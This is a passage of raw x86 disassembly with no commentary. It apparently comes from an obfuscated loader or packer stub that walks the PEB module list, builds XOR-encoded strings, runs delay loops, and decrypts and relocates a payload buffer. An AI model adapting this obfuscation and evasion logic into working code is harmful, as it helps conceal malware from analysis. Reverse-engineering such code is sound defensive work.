  42031c:	mov    ecx,0x926b1bbc
  420321:	sbb    al,0x1b
  420323:	or     ebp,DWORD PTR [ebx-0x3e44389]
  420329:	pop    eax
  42032a:	std    
  42032b:	mov    ch,0xcf
  42032d:	mov    bl,BYTE PTR [ebx+ebx*1-0x54e56d95]
  420334:	lods   eax,DWORD PTR ds:[esi]
  420335:	fcomp  QWORD PTR [ebx]
  420337:	or     edi,DWORD PTR [ecx-0x1f963846]
  42033d:	mov    edx,DWORD PTR [edx+0x49c7b732]
  420343:	mov    dh,0x6f
  420345:	mov    esp,0xe7580b1b
  42034a:	mov    ecx,0xab8b71f2
  42034f:	mov    ecx,DWORD PTR [ebx+0x3292b637]
  420355:	lahf   
  420356:	and    al,0x8f
  420358:	ror    BYTE PTR [ebx+0x3cc18e97],0x1b
  42035f:	mov    WORD PTR [edx+0x29053692],ds
  420365:	dec    esp
  420366:	and    al,0x20
  420368:	sub    ebx,ecx
  42036a:	sub    WORD PTR [ebp+0x0],dx
  42036e:	add    eax,eax
  420370:	add    eax,0x1
  420373:	lea    ebp,[esp+0x40]
  420377:	ret    
  420378:	push   ebp
  420379:	mov    ebp,esp
  42037b:	sub    esp,0x12c
  420381:	push   ebx
  420382:	push   esi
  420383:	push   edi
  420384:	mov    DWORD PTR [ebp-0x10],0xf89c85b5
  42038b:	mov    DWORD PTR [ebp-0x18],0xf89c85b4
  420392:	mov    eax,DWORD PTR [ebp+0x8]
  420395:	mov    DWORD PTR [ebp+0x8],eax
  420398:	mov    ecx,DWORD PTR [ebp-0x10]
  42039b:	mov    ebx,0x75108b3
  4203a0:	xor    ecx,ebx
  4203a2:	mov    eax,0x3272fa
  4203a7:	add    ecx,eax
  4203a9:	mov    DWORD PTR [ebp-0x2c],ecx
  4203ac:	mov    ecx,DWORD PTR [ebp-0x10]
  4203af:	xor    ecx,ebx
  4203b1:	add    ecx,eax
  4203b3:	mov    DWORD PTR [ebp-0x3c],ecx
  4203b6:	mov    ecx,DWORD PTR [ebp-0x10]
  4203b9:	xor    ecx,ebx
  4203bb:	add    ecx,eax
  4203bd:	mov    DWORD PTR [ebp-0x40],ecx
  4203c0:	mov    ecx,DWORD PTR [ebp-0x10]
  4203c3:	xor    ecx,ebx
  4203c5:	add    ecx,eax
  4203c7:	mov    DWORD PTR [ebp-0xd8],ecx
  4203cd:	mov    DWORD PTR [ebp-0x50],0xf89f05b5
  4203d4:	mov    DWORD PTR [ebp-0x40],0xf89cb5b5
  4203db:	mov    DWORD PTR [ebp-0x54],0xf89c85b9
  4203e2:	push   0x25
  4203e4:	pop    ecx
  4203e5:	mov    DWORD PTR [ebp-0x38],ecx
  4203e8:	mov    DWORD PTR [ebp-0x38],ecx
  4203eb:	push   0x65
  4203ed:	pop    ecx
  4203ee:	mov    DWORD PTR [ebp-0x38],ecx
  4203f1:	mov    DWORD PTR [ebp-0x38],ecx
  4203f4:	mov    DWORD PTR [ebp-0x38],0x4d
  4203fb:	mov    DWORD PTR [ebp-0x38],0x43
  420402:	mov    ecx,DWORD PTR [ebp-0x10]
  420405:	xor    ecx,ebx
  420407:	add    ecx,eax
  420409:	mov    DWORD PTR [ebp-0x38],ecx
  42040c:	mov    ecx,DWORD PTR [ebp-0x10]
  42040f:	xor    ecx,ebx
  420411:	add    ecx,eax
  420413:	mov    DWORD PTR [ebp-0x38],ecx
  420416:	mov    DWORD PTR [ebp-0x28],0x258
  42041d:	mov    DWORD PTR [ebp-0x20],0x36
  420424:	mov    DWORD PTR [ebp-0x14],0x7a
  42042b:	lea    edi,[ebp-0x10c]
  420431:	lea    esi,[ebp-0x12c]
  420437:	call   0x4210f9
  42043c:	dec    DWORD PTR [ebp-0x14]
  42043f:	jne    0x42042b
  420441:	dec    DWORD PTR [ebp-0x20]
  420444:	jne    0x420424
  420446:	dec    DWORD PTR [ebp-0x28]
  420449:	jne    0x42041d
  42044b:	mov    DWORD PTR [ebp-0x28],0x400e
  420452:	mov    eax,DWORD PTR [ebp-0x10]
  420455:	xor    eax,ebx
  420457:	mov    esi,0x3272fa
  42045c:	add    eax,esi
  42045e:	mov    DWORD PTR [ebp-0x1c],eax
  420461:	mov    eax,DWORD PTR [ebp-0x10]
  420464:	and    DWORD PTR [ebp-0x94],0x0
  42046b:	xor    eax,ebx
  42046d:	add    eax,esi
  42046f:	mov    DWORD PTR [ebp-0x34],eax
  420472:	mov    eax,fs:0x18
  420478:	mov    DWORD PTR [ebp-0x94],eax
  42047e:	mov    eax,DWORD PTR [eax+0x30]
  420481:	mov    DWORD PTR [ebp-0xcc],eax
  420487:	mov    eax,DWORD PTR [eax+0xc]
  42048a:	mov    DWORD PTR [ebp-0xc0],eax
  420490:	mov    eax,DWORD PTR [ebp+0x8]
  420493:	lea    ecx,[ebp-0x94]
  420499:	mov    DWORD PTR [eax+0x1a0],ecx
  42049f:	mov    eax,DWORD PTR [ebp+0x8]
  4204a2:	lea    ecx,[ebp-0xcc]
  4204a8:	mov    DWORD PTR [eax+0x1a4],ecx
  4204ae:	mov    eax,DWORD PTR [ebp+0x8]
  4204b1:	push   DWORD PTR [ebp+0x8]
  4204b4:	lea    ecx,[ebp-0xc0]
  4204ba:	mov    DWORD PTR [eax+0x1a8],ecx
  4204c0:	call   0x4228ba
  4204c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4204c8:	xor    ecx,ebx
  4204ca:	add    ecx,esi
  4204cc:	cmp    ecx,eax
  4204ce:	je     0x420851
  4204d4:	mov    eax,DWORD PTR [ebp+0x8]
  4204d7:	mov    eax,DWORD PTR [eax+0x194]
  4204dd:	mov    ecx,DWORD PTR [eax]
  4204df:	mov    eax,DWORD PTR [ebp+0x8]
  4204e2:	mov    eax,DWORD PTR [eax+0x194]
  4204e8:	mov    eax,DWORD PTR [eax]
  4204ea:	add    eax,DWORD PTR [ecx+0x3c]
  4204ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4204f0:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4204f6:	lea    edx,[ebp-0xec]
  4204fc:	push   edx
  4204fd:	mov    edx,DWORD PTR [ebp+0x8]
  420500:	mov    edx,DWORD PTR [edx+0x18c]
  420506:	mov    edx,DWORD PTR [edx]
  420508:	add    edx,DWORD PTR [eax+0x88]
  42050e:	push   0x4
  420510:	push   DWORD PTR [eax+0x8c]
  420516:	push   edx
  420517:	call   DWORD PTR [ecx+0x1c]
  42051a:	push   DWORD PTR [ebp+0x8]
  42051d:	xor    eax,eax
  42051f:	mov    DWORD PTR [ebp-0xa8],0xe3bcecc2
  420529:	mov    DWORD PTR [ebp-0xa4],0xe8c7edda
  420533:	mov    DWORD PTR [ebp-0xa0],0xbaeddef0
  42053d:	mov    BYTE PTR [ebp-0x9c],0x7b
  420544:	lea    edi,[ebp-0x9b]
  42054a:	stos   DWORD PTR es:[edi],eax
  42054b:	stos   WORD PTR es:[edi],ax
  42054d:	stos   BYTE PTR es:[edi],al
  42054e:	xor    eax,eax
  420550:	mov    DWORD PTR [ebp-0xbc],0xe3bcecc2
  42055a:	mov    DWORD PTR [ebp-0xb8],0xe8c7edda
  420564:	mov    DWORD PTR [ebp-0xb4],0xd0eddef0
  42056e:	mov    BYTE PTR [ebp-0xb0],0x7b
  420575:	lea    edi,[ebp-0xaf]
  42057b:	stos   DWORD PTR es:[edi],eax
  42057c:	stos   WORD PTR es:[edi],ax
  42057e:	stos   BYTE PTR es:[edi],al
  42057f:	mov    edi,DWORD PTR [ebp+0x8]
  420582:	mov    eax,DWORD PTR [ebp+0x8]
  420585:	mov    edx,DWORD PTR [eax+0x1b8]
  42058b:	mov    DWORD PTR [ebp-0x68],0xedefece7
  420592:	mov    DWORD PTR [ebp-0x64],0xe2ebe6dc
  420599:	mov    WORD PTR [ebp-0x60],0x7bba
  42059f:	mov    DWORD PTR [ebp-0x90],0xe3bcecc2
  4205a9:	mov    DWORD PTR [ebp-0x8c],0xe7baedda
  4205b3:	mov    DWORD PTR [ebp-0x88],0xc9dae3eb
  4205bd:	mov    DWORD PTR [ebp-0x84],0xeddee6ee
  4205c7:	mov    DWORD PTR [ebp-0x80],0x7bbadce2
  4205ce:	mov    DWORD PTR [ebp-0x7c],0xe3bcecc2
  4205d5:	mov    DWORD PTR [ebp-0x78],0xe7baedda
  4205dc:	mov    DWORD PTR [ebp-0x74],0xc9dae3eb
  4205e3:	mov    DWORD PTR [ebp-0x70],0xeddee6ee
  4205ea:	mov    DWORD PTR [ebp-0x6c],0x7bd0dce2
  4205f1:	call   0x4228e9
  4205f6:	push   eax
  4205f7:	mov    eax,DWORD PTR [ebp+0x8]
  4205fa:	mov    eax,DWORD PTR [eax+0x1a8]
  420600:	push   DWORD PTR [eax]
  420602:	call   0x42258a
  420607:	test   eax,eax
  420609:	jne    0x42065b
  42060b:	mov    eax,DWORD PTR [ebp+0x8]
  42060e:	mov    eax,DWORD PTR [eax+0x1e0]
  420614:	mov    edi,DWORD PTR [ebp+0x8]
  420617:	add    eax,0x4
  42061a:	mov    DWORD PTR [ebp-0x24],eax
  42061d:	mov    eax,DWORD PTR [ebp+0x8]
  420620:	mov    edx,DWORD PTR [eax+0x1b8]
  420626:	call   0x4228e9
  42062b:	push   eax
  42062c:	mov    eax,DWORD PTR [ebp-0x24]
  42062f:	call   DWORD PTR [eax]
  420631:	test   eax,eax
  420633:	jne    0x42065b
  420635:	mov    eax,DWORD PTR [ebp+0x8]
  420638:	mov    eax,DWORD PTR [eax+0x1e0]
  42063e:	mov    edi,DWORD PTR [ebp+0x8]
  420641:	add    eax,0x10
  420644:	mov    DWORD PTR [ebp-0x24],eax
  420647:	mov    eax,DWORD PTR [ebp+0x8]
  42064a:	mov    edx,DWORD PTR [eax+0x1b8]
  420650:	call   0x4228e9
  420655:	push   eax
  420656:	mov    eax,DWORD PTR [ebp-0x24]
  420659:	call   DWORD PTR [eax]
  42065b:	mov    eax,DWORD PTR [ebp-0x10]
  42065e:	mov    ecx,DWORD PTR [ebp-0x28]
  420661:	xor    eax,ebx
  420663:	add    eax,esi
  420665:	cmp    eax,ecx
  420667:	je     0x42082a
  42066d:	mov    eax,DWORD PTR [ebp-0x18]
  420670:	xor    eax,ebx
  420672:	mov    ecx,0xffcd8d06
  420677:	sub    ecx,eax
  420679:	add    ecx,DWORD PTR [ebp-0x28]
  42067c:	mov    eax,DWORD PTR [ebp-0x1c]
  42067f:	cmp    eax,ecx
  420681:	ja     0x42082a
  420687:	mov    DWORD PTR [ebp-0x20],0x0
  42068e:	push   DWORD PTR [ebp+0x8]
  420691:	mov    edi,DWORD PTR [ebp+0x8]
  420694:	mov    eax,DWORD PTR [ebp+0x8]
  420697:	mov    edx,DWORD PTR [eax+0x1b4]
  42069d:	call   0x4228e9
  4206a2:	push   eax
  4206a3:	mov    eax,DWORD PTR [ebp+0x8]
  4206a6:	mov    eax,DWORD PTR [eax+0x1a8]
  4206ac:	push   DWORD PTR [eax]
  4206ae:	call   0x42258a
  4206b3:	mov    ecx,DWORD PTR [ebp+0x8]
  4206b6:	mov    ecx,DWORD PTR [ecx+0x19c]
  4206bc:	mov    DWORD PTR [ecx],eax
  4206be:	mov    eax,DWORD PTR [ebp+0x8]
  4206c1:	mov    edi,DWORD PTR [eax+0x1e0]
  4206c7:	mov    esi,DWORD PTR [ebp+0x8]
  4206ca:	xor    eax,eax
  4206cc:	lea    edx,[ebp-0x7c]
  4206cf:	call   0x42291f
  4206d4:	push   eax
  4206d5:	mov    eax,DWORD PTR [ebp+0x8]
  4206d8:	mov    eax,DWORD PTR [eax+0x19c]
  4206de:	push   DWORD PTR [eax]
  4206e0:	call   DWORD PTR [edi+0x8]
  4206e3:	mov    DWORD PTR [ebp-0x24],eax
  4206e6:	mov    eax,DWORD PTR [ebp+0x8]
  4206e9:	mov    edi,DWORD PTR [eax+0x1e0]
  4206ef:	mov    esi,DWORD PTR [ebp+0x8]
  4206f2:	xor    eax,eax
  4206f4:	lea    edx,[ebp-0x90]
  4206fa:	call   0x42291f
  4206ff:	push   eax
  420700:	mov    eax,DWORD PTR [ebp+0x8]
  420703:	mov    eax,DWORD PTR [eax+0x19c]
  420709:	push   DWORD PTR [eax]
  42070b:	call   DWORD PTR [edi+0x8]
  42070e:	mov    eax,DWORD PTR [ebp+0x8]
  420711:	mov    edi,DWORD PTR [eax+0x1e0]
  420717:	mov    esi,DWORD PTR [ebp+0x8]
  42071a:	xor    eax,eax
  42071c:	lea    edx,[ebp-0xa8]
  420722:	call   0x42291f
  420727:	push   eax
  420728:	mov    eax,DWORD PTR [ebp+0x8]
  42072b:	mov    eax,DWORD PTR [eax+0x19c]
  420731:	push   DWORD PTR [eax]
  420733:	call   DWORD PTR [edi+0x8]
  420736:	and    DWORD PTR [ebp-0x8],0x0
  42073a:	mov    DWORD PTR [ebp-0x44],eax
  42073d:	mov    eax,DWORD PTR [ebp-0x8]
  420740:	and    eax,0x7
  420743:	add    eax,0x31
  420746:	push   eax
  420747:	call   DWORD PTR [ebp-0x24]
  42074a:	test   eax,eax
  42074c:	je     0x420790
  42074e:	mov    eax,DWORD PTR [ebp-0x8]
  420751:	push   0x19
  420753:	xor    edx,edx
  420755:	pop    ecx
  420756:	div    ecx
  420758:	add    dl,0x41
  42075b:	movzx  eax,dl
  42075e:	push   eax
  42075f:	call   DWORD PTR [ebp-0x44]
  420762:	test   eax,eax
  420764:	jne    0x420790
  420766:	mov    eax,DWORD PTR [ebp+0x8]
  420769:	mov    edi,DWORD PTR [eax+0x1e0]
  42076f:	mov    esi,DWORD PTR [ebp+0x8]
  420772:	xor    eax,eax
  420774:	lea    edx,[ebp-0x68]
  420777:	call   0x42291f
  42077c:	push   eax
  42077d:	mov    eax,DWORD PTR [ebp+0x8]
  420780:	mov    eax,DWORD PTR [eax+0x198]
  420786:	push   DWORD PTR [eax]
  420788:	call   DWORD PTR [edi+0x8]
  42078b:	mov    DWORD PTR [ebp-0x14],eax
  42078e:	jmp    0x420794
  420790:	and    DWORD PTR [ebp-0x14],0x0
  420794:	inc    DWORD PTR [ebp-0x8]
  420797:	cmp    DWORD PTR [ebp-0x8],0x10
  42079b:	jb     0x42073d
  42079d:	mov    eax,DWORD PTR [ebp-0x18]
  4207a0:	mov    esi,DWORD PTR [ebp+0x8]
  4207a3:	xor    eax,ebx
  4207a5:	mov    edi,0x3272fa
  4207aa:	add    eax,edi
  4207ac:	lea    edx,[ebp-0x10c]
  4207b2:	call   0x42291f
  4207b7:	push   eax
  4207b8:	mov    eax,DWORD PTR [ebp-0x10]
  4207bb:	mov    esi,DWORD PTR [ebp+0x8]
  4207be:	xor    eax,ebx
  4207c0:	add    eax,edi
  4207c2:	lea    edx,[ebp-0x12c]
  4207c8:	call   0x42291f
  4207cd:	push   eax
  4207ce:	call   DWORD PTR [ebp-0x14]
  4207d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4207d4:	xor    ecx,ebx
  4207d6:	add    ecx,edi
  4207d8:	cmp    ecx,eax
  4207da:	jne    0x4207e3
  4207dc:	mov    DWORD PTR [ebp-0x20],0x1
  4207e3:	mov    eax,DWORD PTR [ebp-0x18]
  4207e6:	mov    ecx,DWORD PTR [ebp-0x1c]
  4207e9:	xor    eax,ebx
  4207eb:	lea    eax,[eax+ecx*1+0x3272fa]
  4207f2:	mov    DWORD PTR [ebp-0x1c],eax
  4207f5:	mov    eax,DWORD PTR [ebp-0x20]
  4207f8:	test   eax,eax
  4207fa:	je     0x42080e
  4207fc:	mov    eax,DWORD PTR [ebp-0x18]
  4207ff:	mov    ecx,DWORD PTR [ebp-0x34]
  420802:	xor    eax,ebx
  420804:	lea    eax,[eax+ecx*1+0x3272fa]
  42080b:	mov    DWORD PTR [ebp-0x34],eax
  42080e:	mov    eax,DWORD PTR [ebp-0x18]
  420811:	xor    eax,ebx
  420813:	mov    ecx,0xffcd8d06
  420818:	sub    ecx,eax
  42081a:	add    ecx,DWORD PTR [ebp-0x28]
  42081d:	mov    eax,DWORD PTR [ebp-0x1c]
  420820:	cmp    eax,ecx
  420822:	jbe    0x420687
  420828:	mov    esi,edi
  42082a:	mov    eax,DWORD PTR [ebp-0x34]
  42082d:	mov    ecx,DWORD PTR [ebp-0x1c]
  420830:	cmp    ecx,eax
  420832:	jne    0x420845
  420834:	push   DWORD PTR [ebp+0x8]
  420837:	lea    eax,[ebp-0x3c]
  42083a:	push   eax
  42083b:	call   0x42338e
  420840:	mov    DWORD PTR [ebp-0x2c],eax
  420843:	jmp    0x420851
  420845:	mov    eax,DWORD PTR [ebp-0x2c]
  420848:	mov    ecx,DWORD PTR [ebp-0x18]
  42084b:	xor    ecx,ebx
  42084d:	add    ecx,esi
  42084f:	xor    DWORD PTR [eax],ecx
  420851:	mov    eax,DWORD PTR [ebp-0x10]
  420854:	mov    ecx,DWORD PTR [ebp-0x2c]
  420857:	xor    eax,ebx
  420859:	add    eax,esi
  42085b:	cmp    eax,ecx
  42085d:	je     0x420fd7
  420863:	mov    eax,DWORD PTR [ebp-0x10]
  420866:	mov    ecx,DWORD PTR [ebp-0x3c]
  420869:	xor    eax,ebx
  42086b:	add    eax,esi
  42086d:	cmp    eax,ecx
  42086f:	je     0x420fd7
  420875:	mov    eax,DWORD PTR [ebp-0x10]
  420878:	xor    eax,ebx
  42087a:	add    eax,esi
  42087c:	jmp    0x42089a
  42087e:	mov    edi,DWORD PTR [ebp-0x2c]
  420881:	mov    cl,al
  420883:	and    cl,0x1f
  420886:	or     dl,0xff
  420889:	sub    dl,cl
  42088b:	add    BYTE PTR [edi+eax*1],dl
  42088e:	mov    ecx,DWORD PTR [ebp-0x18]
  420891:	xor    ecx,ebx
  420893:	lea    eax,[eax+ecx*1+0x3272fa]
  42089a:	mov    ecx,DWORD PTR [ebp-0x3c]
  42089d:	cmp    eax,ecx
  42089f:	jb     0x42087e
  4208a1:	mov    eax,DWORD PTR [ebp-0x3c]
  4208a4:	mov    DWORD PTR [ebp-0x28],eax
  4208a7:	mov    eax,DWORD PTR [ebp-0x2c]
  4208aa:	mov    DWORD PTR [ebp-0x34],0xf89c85b5
  4208b1:	mov    DWORD PTR [ebp-0xd4],eax
  4208b7:	mov    edi,0xf89c85b4
  4208bc:	mov    DWORD PTR [ebp-0x30],edi
  4208bf:	mov    eax,DWORD PTR [ebp-0x34]
  4208c2:	xor    eax,ebx
  4208c4:	add    eax,esi
  4208c6:	mov    DWORD PTR [ebp-0xc],eax
  4208c9:	mov    eax,DWORD PTR [ebp-0x34]
  4208cc:	xor    eax,ebx
  4208ce:	add    eax,esi
  4208d0:	mov    DWORD PTR [ebp-0x8],eax
  4208d3:	mov    DWORD PTR [ebp-0x44],0xf89c8595
  4208da:	mov    DWORD PTR [ebp-0x4c],0xf89c85be
  4208e1:	mov    eax,DWORD PTR [ebp-0x34]
  4208e4:	mov    ecx,DWORD PTR [ebp-0x28]
  4208e7:	xor    eax,ebx
  4208e9:	add    eax,esi
  4208eb:	cmp    ecx,eax
  4208ed:	je     0x420aec
  4208f3:	jmp    0x420ac8
  4208f8:	mov    ecx,DWORD PTR [ebp-0xc]
  4208fb:	mov    eax,DWORD PTR [ebp-0x28]
  4208fe:	sub    eax,ecx
  420900:	mov    ecx,DWORD PTR [ebp-0x44]
  420903:	xor    ecx,ebx
  420905:	add    ecx,esi
  420907:	xor    edx,edx
  420909:	div    ecx
  42090b:	mov    DWORD PTR [ebp-0x8],eax
  42090e:	mov    eax,DWORD PTR [ebp-0x4c]
  420911:	mov    ecx,DWORD PTR [ebp-0x8]
  420914:	xor    eax,ebx
  420916:	add    eax,esi
  420918:	cmp    ecx,eax
  42091a:	jbe    0x420926
  42091c:	mov    eax,DWORD PTR [ebp-0x4c]
  42091f:	xor    eax,ebx
  420921:	add    eax,esi
  420923:	mov    DWORD PTR [ebp-0x8],eax
  420926:	mov    eax,DWORD PTR [ebp-0x44]
  420929:	mov    ecx,DWORD PTR [ebp-0x8]
  42092c:	xor    eax,ebx
  42092e:	add    eax,esi
  420930:	imul   eax,ecx
  420933:	mov    DWORD PTR [ebp-0x8],eax
  420936:	mov    eax,DWORD PTR [ebp-0x34]
  420939:	mov    ecx,DWORD PTR [ebp-0x8]
  42093c:	xor    eax,ebx
  42093e:	add    eax,esi
  420940:	cmp    ecx,eax
  420942:	je     0x420ab6
  420948:	mov    eax,DWORD PTR [ebp-0x8]
  42094b:	mov    DWORD PTR [ebp-0x14],eax
  42094e:	mov    eax,DWORD PTR [ebp-0xc]
  420951:	add    eax,DWORD PTR [ebp-0xd4]
  420957:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  42095e:	mov    DWORD PTR [ebp-0x20],edi
  420961:	mov    DWORD PTR [ebp-0xe8],0xf89c85bb
  42096b:	mov    DWORD PTR [ebp-0x8],eax
  42096e:	mov    DWORD PTR [ebp-0x38],0xf89c85ba
  420975:	mov    DWORD PTR [ebp-0x1c],edi
  420978:	mov    eax,DWORD PTR [ebp-0x24]
  42097b:	xor    eax,ebx
  42097d:	add    eax,esi
  42097f:	jmp    0x420a75
  420984:	mov    DWORD PTR [ebp-0xe0],0xf89c85a2
  42098e:	mov    DWORD PTR [ebp-0xc4],0xf89c85af
  420998:	mov    eax,DWORD PTR [ebp-0x1c]
  42099b:	mov    ecx,DWORD PTR [ebp-0x48]
  42099e:	xor    eax,ebx
  4209a0:	add    eax,esi
  4209a2:	imul   eax,ecx
  4209a5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209a8:	mov    al,BYTE PTR [eax+ecx*1]
  4209ab:	mov    BYTE PTR [ebp-0x2],al
  4209ae:	mov    eax,DWORD PTR [ebp-0x1c]
  4209b1:	mov    ecx,DWORD PTR [ebp-0x48]
  4209b4:	xor    eax,ebx
  4209b6:	add    eax,esi
  4209b8:	imul   eax,ecx
  4209bb:	mov    ecx,DWORD PTR [ebp-0xe8]
  4209c1:	xor    ecx,ebx
  4209c3:	add    eax,ecx
  4209c5:	mov    ecx,DWORD PTR [ebp-0x8]
  4209c8:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  4209d0:	mov    ecx,DWORD PTR [ebp-0xe0]
  4209d6:	xor    ecx,ebx
  4209d8:	lea    eax,[ecx+eax*1+0x3272fa]
  4209df:	movzx  ecx,BYTE PTR [ebp-0x2]
  4209e3:	xor    ecx,eax
  4209e5:	mov    BYTE PTR [ebp-0x2],cl
  4209e8:	mov    al,BYTE PTR [ebp-0x2]
  4209eb:	mov    ecx,DWORD PTR [ebp-0x1c]
  4209ee:	mov    edx,DWORD PTR [ebp-0x48]
  4209f1:	xor    ecx,ebx
  4209f3:	add    ecx,esi
  4209f5:	imul   ecx,edx
  4209f8:	mov    edx,DWORD PTR [ebp-0x8]
  4209fb:	mov    BYTE PTR [ecx+edx*1],al
  4209fe:	mov    eax,DWORD PTR [ebp-0x1c]
  420a01:	mov    ecx,DWORD PTR [ebp-0x48]
  420a04:	xor    eax,ebx
  420a06:	add    eax,esi
  420a08:	imul   eax,ecx
  420a0b:	mov    ecx,DWORD PTR [ebp-0x8]
  420a0e:	mov    al,BYTE PTR [eax+ecx*1]
  420a11:	mov    BYTE PTR [ebp-0x2],al
  420a14:	mov    eax,DWORD PTR [ebp-0x1c]
  420a17:	mov    ecx,DWORD PTR [ebp-0x48]
  420a1a:	xor    eax,ebx
  420a1c:	add    eax,esi
  420a1e:	imul   eax,ecx
  420a21:	mov    ecx,DWORD PTR [ebp-0x20]
  420a24:	xor    ecx,ebx
  420a26:	add    eax,ecx
  420a28:	mov    ecx,DWORD PTR [ebp-0x8]
  420a2b:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272fa]
  420a33:	mov    ecx,DWORD PTR [ebp-0xc4]
  420a39:	xor    ecx,ebx
  420a3b:	lea    eax,[ecx+eax*1+0x3272fa]
  420a42:	movzx  ecx,BYTE PTR [ebp-0x2]
  420a46:	xor    ecx,eax
  420a48:	mov    BYTE PTR [ebp-0x2],cl
  420a4b:	mov    al,BYTE PTR [ebp-0x2]
  420a4e:	mov    ecx,DWORD PTR [ebp-0x1c]
  420a51:	mov    edx,DWORD PTR [ebp-0x48]
  420a54:	xor    ecx,ebx
  420a56:	add    ecx,esi
  420a58:	imul   ecx,edx
  420a5b:	mov    edx,DWORD PTR [ebp-0x8]
  420a5e:	mov    BYTE PTR [ecx+edx*1],al
  420a61:	mov    eax,DWORD PTR [ebp-0x38]
  420a64:	mov    ecx,DWORD PTR [ebp-0x20]
  420a67:	xor    eax,ebx
  420a69:	xor    ecx,ebx
  420a6b:	add    eax,esi
  420a6d:	add    ecx,esi
  420a6f:	imul   eax,ecx
  420a72:	add    eax,DWORD PTR [ebp-0x48]
  420a75:	mov    DWORD PTR [ebp-0x48],eax
  420a78:	mov    eax,DWORD PTR [ebp-0x48]
  420a7b:	mov    ecx,DWORD PTR [ebp-0x14]
  420a7e:	cmp    ecx,eax
  420a80:	jb     0x420984
  420a86:	mov    eax,DWORD PTR [ebp-0x20]
  420a89:	mov    ecx,DWORD PTR [ebp-0x14]
  420a8c:	xor    eax,ebx
  420a8e:	add    eax,esi
  420a90:	imul   eax,ecx
  420a93:	mov    ecx,DWORD PTR [ebp-0x24]
  420a96:	xor    ecx,ebx
  420a98:	add    ecx,esi
  420a9a:	or     eax,ecx
  420a9c:	mov    ecx,DWORD PTR [ebp-0x30]
  420a9f:	xor    ecx,ebx
  420aa1:	add    eax,ecx
  420aa3:	mov    ecx,DWORD PTR [ebp-0x30]
  420aa6:	xor    ecx,ebx
  420aa8:	add    eax,ecx
  420aaa:	mov    ecx,DWORD PTR [ebp-0xc]
  420aad:	lea    eax,[eax+ecx*1+0x64e5f4]
  420ab4:	jmp    0x420ac5
  420ab6:	mov    eax,DWORD PTR [ebp-0x30]
  420ab9:	mov    ecx,DWORD PTR [ebp-0xc]
  420abc:	xor    eax,ebx
  420abe:	lea    eax,[eax+ecx*1+0x3272fa]
  420ac5:	mov    DWORD PTR [ebp-0xc],eax
  420ac8:	mov    eax,DWORD PTR [ebp-0x30]
  420acb:	xor    eax,ebx
  420acd:	mov    ecx,0xffcd8d06
  420ad2:	sub    ecx,eax
  420ad4:	add    ecx,DWORD PTR [ebp-0x28]
  420ad7:	mov    eax,DWORD PTR [ebp-0x30]
  420ada:	mov    edx,DWORD PTR [ebp-0xc]
  420add:	xor    eax,ebx
  420adf:	add    eax,esi
  420ae1:	imul   eax,edx
  420ae4:	cmp    eax,ecx
  420ae6:	jbe    0x4208f8
  420aec:	mov    eax,DWORD PTR [ebp-0x10]
  420aef:	mov    ecx,DWORD PTR [ebp-0x3c]
  420af2:	mov    eax,DWORD PTR [ebp+0x8]
  420af5:	mov    edx,DWORD PTR [ebp-0x54]
  420af8:	mov    eax,DWORD PTR [eax+0x1e0]
  420afe:	xor    edx,ebx
  420b00:	add    edx,esi
  420b02:	push   edx
  420b03:	mov    edx,DWORD PTR [ebp-0x40]
  420b06:	xor    edx,ebx
  420b08:	add    edx,esi
  420b0a:	push   edx
  420b0b:	push   ecx
  420b0c:	mov    DWORD PTR [ebp-0x38],ecx
  420b0f:	mov    ecx,DWORD PTR [ebp-0x10]
  420b12:	xor    ecx,ebx
  420b14:	add    ecx,esi
  420b16:	push   ecx
  420b17:	call   DWORD PTR [eax+0x14]
  420b1a:	mov    edi,eax
  420b1c:	mov    eax,DWORD PTR [ebp-0x10]
  420b1f:	xor    eax,ebx
  420b21:	add    eax,esi
  420b23:	cmp    eax,edi
  420b25:	je     0x420b80
  420b27:	mov    eax,DWORD PTR [ebp-0x10]
  420b2a:	jmp    0x420b4d
  420b2c:	mov    ecx,DWORD PTR [ebp-0x2c]
  420b2f:	xor    eax,ebx
  420b31:	mov    cl,BYTE PTR [ecx+eax*1+0x3272fa]
  420b38:	mov    BYTE PTR [eax+edi*1+0x3272fa],cl
  420b3f:	mov    ecx,DWORD PTR [ebp-0x18]
  420b42:	xor    ecx,ebx
  420b44:	lea    eax,[ecx+eax*1+0x3272fa]
  420b4b:	xor    eax,ebx
  420b4d:	mov    ecx,DWORD PTR [ebp-0x3c]
  420b50:	sub    ecx,esi
  420b52:	xor    ecx,ebx
  420b54:	cmp    eax,ecx
  420b56:	jne    0x420b2c
  420b58:	mov    eax,DWORD PTR [ebp+0x8]
  420b5b:	mov    ecx,DWORD PTR [ebp-0x50]
  420b5e:	mov    eax,DWORD PTR [eax+0x1e0]
  420b64:	xor    ecx,ebx
  420b66:	add    ecx,esi
  420b68:	push   ecx
  420b69:	mov    ecx,DWORD PTR [ebp-0x10]
  420b6c:	xor    ecx,ebx
  420b6e:	add    ecx,esi
  420b70:	push   ecx
  420b71:	push   DWORD PTR [ebp-0x2c]
  420b74:	call   DWORD PTR [eax+0x18]
  420b77:	mov    eax,DWORD PTR [ebp-0x38]
  420b7a:	mov    DWORD PTR [ebp-0x2c],edi
  420b7d:	mov    DWORD PTR [ebp-0x3c],eax
  420b80:	mov    eax,DWORD PTR [ebp-0x2c]
  420b83:	mov    DWORD PTR [ebp-0x14],eax
  420b86:	mov    eax,DWORD PTR [ebp-0x18]
  420b89:	mov    ecx,DWORD PTR [ebp-0x10]
  420b8c:	xor    eax,ebx
  420b8e:	add    eax,esi
  420b90:	mov    DWORD PTR [ebp-0x5c],0xbad3cbd3
  420b97:	mov    DWORD PTR [ebp-0x58],0xc4d3bcd3
  420b9e:	jmp    0x420bd1
  420ba0:	mov    edx,DWORD PTR [ebp-0x14]
  420ba3:	mov    edi,ecx
  420ba5:	xor    edi,ebx
  420ba7:	mov    cl,BYTE PTR [ebp+edi*1+0x32729e]
  420bae:	movsx  edx,BYTE PTR [edi+edx*1+0x3272fa]
  420bb6:	xor    cl,0x81
  420bb9:	add    cl,0x6
  420bbc:	movzx  ecx,cl
  420bbf:	cmp    edx,ecx
  420bc1:	jne    0x420bdb
